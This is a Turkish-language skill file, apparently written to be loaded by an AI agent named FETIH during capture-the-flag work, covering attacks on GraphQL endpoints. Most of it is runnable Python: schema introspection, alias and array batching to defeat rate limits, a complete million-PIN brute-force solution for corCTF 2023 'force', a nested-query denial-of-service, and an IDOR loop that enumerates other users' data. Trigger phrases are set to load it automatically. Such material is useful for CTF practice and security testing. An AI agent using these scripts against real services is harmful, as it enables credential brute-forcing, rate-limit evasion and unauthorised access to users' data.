---
name: graphql-attacks
description: GraphQL saldırıları — introspection, aliased query batching, rate limit bypass
tags: [ctf, web, graphql, introspection, batching, rate-limit-bypass, brute-force]
triggers:
  - "GraphQL"
  - "graphql endpoint"
  - "/graphql"
  - "query {"
  - "mutation {"
  - "rate limit"
  - "pin brute force"
  - "aliased queries"
difficulty: medium
category: web
solved_challenges:
  - "corCTF 2023 - force (Fastify+Mercurius, 10000 alias/request ile 10^5 PIN brute)"
adapted_for: fetih
---

# GraphQL Saldırıları

## GraphQL Introspection (Şema Keşfi)

Introspection ile tüm query/mutation/type bilgisini çek. Uygulamalar bunu kapatmayı unutabilir.

```python
import requests
import json

TARGET = "http://<IP>:<PORT>/graphql"

# Standart introspection query
INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    isDeprecated
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
"""


def introspect(url, headers=None):
    """GraphQL şemasını çek ve yazdır"""
    if headers is None:
        headers = {"Content-Type": "application/json"}

    r = requests.post(url, json={"query": INTROSPECTION_QUERY}, headers=headers)

    if r.status_code != 200:
        print(f"[!] Introspection başarısız: {r.status_code}")
        print(r.text[:300])
        return None

    data = r.json()

    if "errors" in data:
        print("[!] Introspection kapalı veya hata:", data["errors"])
        return None

    schema = data["data"]["__schema"]

    print(f"[*] Query tipi: {schema['queryType']}")
    print(f"[*] Mutation tipi: {schema['mutationType']}")
    print(f"\n[*] Tüm tipler:")
    for t in schema["types"]:
        if not t["name"].startswith("__"):
            print(f"    {t['kind']}: {t['name']}")
            if t.get("fields"):
                for f in t["fields"]:
                    args = ", ".join(a["name"] for a in f.get("args", []))
                    print(f"        .{f['name']}({args})")

    return schema


# Introspection'ı başlat
schema = introspect(TARGET)
```

### Kısmi Introspection (Kapalıysa Field Suggestion)

```python
import requests

TARGET = "http://<IP>:<PORT>/graphql"

# Introspection kapalı olsa bile __type ile tek tip sorgulayabilirsin
r = requests.post(TARGET, json={
    "query": '{ __type(name: "User") { name fields { name type { name } } } }'
})
print(r.json())

# Field suggestion: yanlış alan adı yaz, GraphQL "Did you mean X?" der
r = requests.post(TARGET, json={
    "query": '{ user { passw } }'  # "passw" yok ama "password" varsa öneri gelir
})
print(r.text)
```

---

## Aliased Query Batching ile Rate Limit Bypass

GraphQL, tek request'te birden fazla query çalıştırmaya izin verir — alias kullanarak. Rate limit IP başına request sayısını sayıyorsa, 10000 alias = 10000 deneme = 1 request.

### Temel Batching

```python
import requests

TARGET = "http://<IP>:<PORT>/graphql"

# Tek request'te birden fazla query (array batching)
batch_query = [
    {"query": 'query { user(id: 1) { name } }'},
    {"query": 'query { user(id: 2) { name } }'},
    {"query": 'mutation { login(username:"admin", password:"pass1") { token } }'},
]

r = requests.post(TARGET, json=batch_query)
print(r.json())
```

### Alias Batching

```python
import requests

TARGET = "http://<IP>:<PORT>/graphql"

# Alias ile aynı mutation'ı farklı argümanlarla çalıştır
# Rate limit 1 request = 1 deneme sayıyorsa, her alias ayrı denemedir

passwords = ["password", "admin", "123456", "letmein", "qwerty"]

aliases = "\n".join([
    f'  attempt_{i}: login(username: "admin", password: "{pwd}") {{ token success }}'
    for i, pwd in enumerate(passwords)
])

query = f"mutation {{\n{aliases}\n}}"
print("Query:")
print(query)

r = requests.post(TARGET, json={"query": query})
data = r.json()

for i, pwd in enumerate(passwords):
    result = data["data"].get(f"attempt_{i}", {})
    if result.get("success") or result.get("token"):
        print(f"[!] BULUNDU: password={pwd}, token={result.get('token')}")
```

---

## corCTF 2023 — force Tam Python Kodu

**Senaryo:** Fastify + Mercurius GraphQL sunucusu. 6 haneli PIN (10^6 olasılık). Rate limit request bazlı. Tek request'e 10000 alias sığdırılıyor → 100 request ile tüm uzay taranıyor.

```python
#!/usr/bin/env python3
"""
corCTF 2023 - force
GraphQL aliased batching ile 10^6 PIN brute force
100 request x 10000 alias = 1.000.000 deneme
"""

import requests
import json

TARGET = "http://<HEDEF_IP>:<PORT>/graphql"
USERNAME = "admin"
ALIASES_PER_REQUEST = 10000

SESSION = requests.Session()
# SESSION.proxies = {"http": "http://127.0.0.1:8080"}


def build_pin_query(pin_start, count):
    """pin_start'tan itibaren 'count' adet PIN'i tek sorguda dene"""
    aliases = []
    for i in range(count):
        pin = pin_start + i
        if pin > 999999:
            break
        # PIN 6 hane, leading zero ile
        pin_str = f"{pin:06d}"
        alias = f"  p{pin_str}: login(username: \"{USERNAME}\", pin: \"{pin_str}\") {{ success token flag }}"
        aliases.append(alias)

    query = "mutation {\n" + "\n".join(aliases) + "\n}"
    return query


def check_response(data, pin_start, count):
    """Response'da başarılı giriş ara"""
    for i in range(count):
        pin = pin_start + i
        if pin > 999999:
            break
        pin_str = f"{pin:06d}"
        result = data.get(f"p{pin_str}", {})
        if result and (result.get("success") or result.get("token") or result.get("flag")):
            return pin_str, result
    return None, None


def main():
    print(f"[*] Hedef: {TARGET}")
    print(f"[*] Toplam deneme: 1.000.000 PIN")
    print(f"[*] Request başına alias: {ALIASES_PER_REQUEST}")
    print(f"[*] Toplam request: {1000000 // ALIASES_PER_REQUEST}")
    print()

    for batch_num in range(1000000 // ALIASES_PER_REQUEST):
        pin_start = batch_num * ALIASES_PER_REQUEST

        query = build_pin_query(pin_start, ALIASES_PER_REQUEST)

        print(f"[*] Batch {batch_num + 1}: PIN {pin_start:06d} - {pin_start + ALIASES_PER_REQUEST - 1:06d}", end=" ... ")

        try:
            r = SESSION.post(
                TARGET,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=30
            )

            if r.status_code != 200:
                print(f"HATA: {r.status_code}")
                continue

            data = r.json().get("data", {})

            found_pin, result = check_response(data, pin_start, ALIASES_PER_REQUEST)
            if found_pin:
                print(f"\n[!!!] PIN BULUNDU: {found_pin}")
                print(f"      Sonuç: {json.dumps(result, indent=2)}")
                return

            print("OK")

        except requests.exceptions.Timeout:
            print("TIMEOUT — tekrar deniyor...")
            # Aynı batch'i tekrar dene
            batch_num -= 1
            continue
        except Exception as e:
            print(f"HATA: {e}")

    print("[*] Tüm PIN'ler denendi, bulunamadı.")


if __name__ == "__main__":
    main()
```

### Mercurius Özel: Array Batch + Alias Kombinasyonu

```python
# Mercurius hem array batch hem alias destekler
# Bunları birleştirince çarpım etkisi:
# 10 array batch x 1000 alias = 10000 deneme / request

import requests

TARGET = "http://<IP>:<PORT>/graphql"

def mega_batch(pin_start, aliases_per=1000, arrays=10):
    batch = []
    for arr_idx in range(arrays):
        start = pin_start + arr_idx * aliases_per
        aliases = "\n".join([
            f'  p{(start+i):06d}: login(pin: "{(start+i):06d}") {{ success flag }}'
            for i in range(aliases_per)
            if start + i <= 999999
        ])
        batch.append({"query": f"mutation {{\n{aliases}\n}}"})
    return batch

r = requests.post(TARGET, json=mega_batch(0))
print(r.status_code, r.text[:200])
```

---

## Diğer GraphQL Saldırıları

### Depth Limit Bypass (DoS)

```python
import requests

TARGET = "http://<IP>:<PORT>/graphql"

# Nested query ile DoS (depth limit yoksa)
nested = "user { friends { friends { friends { friends { name } } } } }"
r = requests.post(TARGET, json={"query": f"{{ {nested} }}"})
print(r.status_code)
```

### Field Suggestion ile Keşif

```python
# "Did you mean X?" mesajlarını kullan
import requests

TARGET = "http://<IP>:<PORT>/graphql"

fields_to_probe = ["pass", "passwd", "pwd", "secret", "flag", "key", "token", "auth"]
for field in fields_to_probe:
    r = requests.post(TARGET, json={"query": f'{{ user {{ {field} }} }}'})
    if "Did you mean" in r.text or "suggestion" in r.text.lower():
        print(f"[*] '{field}' için öneri:", r.json())
```

### IDOR via GraphQL

```python
import requests

TARGET = "http://<IP>:<PORT>/graphql"

# Kendi token'ın ile başka kullanıcıların datasına eriş
headers = {"Authorization": "Bearer <senin_tokenin>"}

for user_id in range(1, 100):
    r = requests.post(
        TARGET,
        json={"query": f'{{ user(id: {user_id}) {{ id username email flag }} }}'},
        headers=headers
    )
    data = r.json().get("data", {}).get("user", {})
    if data and data.get("flag"):
        print(f"[!] Flag bulundu user_id={user_id}: {data['flag']}")
    elif data:
        print(f"    user_id={user_id}: {data}")
```

---

## Araçlar

### graphql-map (Otomatik Introspection + Query Build)

```bash
# Kurulum
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
pip3 install -r requirements.txt

# Kullanım
python3 graphqlmap.py -u http://<IP>/graphql --method POST
```

### clairvoyance (Introspection Kapalıyken Şema Tahmin)

```bash
# Kurulum
pip3 install clairvoyance

# Kullanım (introspection kapalı endpoint için field tahmin)
clairvoyance http://<IP>/graphql -o schema.json

# Wordlist ile
clairvoyance http://<IP>/graphql -o schema.json -w /usr/share/wordlists/rockyou.txt
```

### Burp Suite ile Manuel Keşif

```
1. Burp'ta /graphql endpoint'ini bul
2. Sağ tık → Send to Repeater
3. Content-Type: application/json yap
4. Body: {"query": "{ __typename }"} — sunucu graphql mi?
5. InQL Burp extension ile introspection otomatik yap
```

---

## Tuzaklar

- **Introspection kapalı:** Field suggestion hâlâ çalışabilir. `clairvoyance` veya elle probe et.
- **10000 alias memory sınırı:** Mercurius/Apollo'da alias limiti olabilir. 429 veya 400 dönüyorsa sayıyı azalt (örn. 1000).
- **Rate limit IP değil token bazlı:** Alias batching işe yaramaz. Farklı token oluşturma / hesap oluşturma bak.
- **Mutation batching kapalı:** Query batching açık olabilir. Sadece okuma operasyonları ile farklı bir yol ara.
- **POST yerine GET:** Bazı GraphQL endpoint'leri GET de destekler: `/graphql?query={user{name}}`
- **CSRF + GraphQL:** Content-Type kontrolü yoksa CSRF ile mutation tetiklenebilir.

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 7ed940ecbf1de662
-->

